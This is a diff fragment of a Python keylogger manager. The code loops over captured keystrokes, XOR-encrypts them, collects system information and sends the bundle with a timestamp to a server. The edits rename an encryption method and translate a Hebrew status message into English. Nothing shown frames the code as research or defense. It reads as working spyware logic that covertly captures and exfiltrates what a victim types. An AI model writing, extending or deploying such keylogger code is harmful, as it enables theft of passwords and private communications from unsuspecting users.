@@ -21,11 +21,11 @@ class KeyLoggerManager:
                self.start.stop_logging()
                time.sleep(self.TIME)
                text =''.join(self.start.get_logged_keys())
-               xor=self.xor.xor_encrypt_decrypt(text,key)
+               xor=self.xor.xor_encrypt(text,key)
                now=datetime.now()
                data_for_system=self.start.system_information()
                self.send_client.send_to_server({"time":now.strftime('%d/%m/%Y %H:%M:%S'),"data":xor,"system":data_for_system})
-               print("נשלח לשרת...")
+               print("sent to server")
                self.start.data.clear()
 
 
